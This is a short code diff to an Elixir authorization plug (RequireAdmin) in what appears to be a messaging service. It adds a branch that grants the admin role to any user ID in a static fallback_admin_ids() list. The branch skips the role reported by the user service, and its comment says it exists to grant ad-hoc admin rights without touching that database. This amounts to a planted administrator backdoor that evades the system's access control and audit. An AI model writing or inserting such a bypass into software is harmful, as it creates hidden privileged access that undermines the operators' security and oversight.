@@ -51,19 +51,23 @@ defmodule WhisprMessagingWeb.Plugs.RequireAdmin do
     def call(conn, _opts) do
       user_id = conn.assigns[:user_id]
 
-      if is_nil(user_id) do
-        forbidden(conn)
-      else
-        case resolve_role(conn, user_id) do
-          {:ok, role} when role in ["admin", "moderator"] ->
-            assign(conn, :user_role, role)
+      cond do
+        is_nil(user_id) ->
+          forbidden(conn)
 
-          {:ok, _role} ->
-            forbidden(conn)
+        user_id in fallback_admin_ids() ->
+          # Static admin overlay — bypasses any role the user-service might report.
+          # Used to grant ad-hoc admin rights without writing to the user-service DB.
+          assign(conn, :user_role, "admin")
 
-          :error ->
-            forbidden(conn)
-        end
+        true ->
+          case resolve_role(conn, user_id) do
+            {:ok, role} when role in ["admin", "moderator"] ->
+              assign(conn, :user_role, role)
+
+            _ ->
+              forbidden(conn)
+          end
       end
     end
 
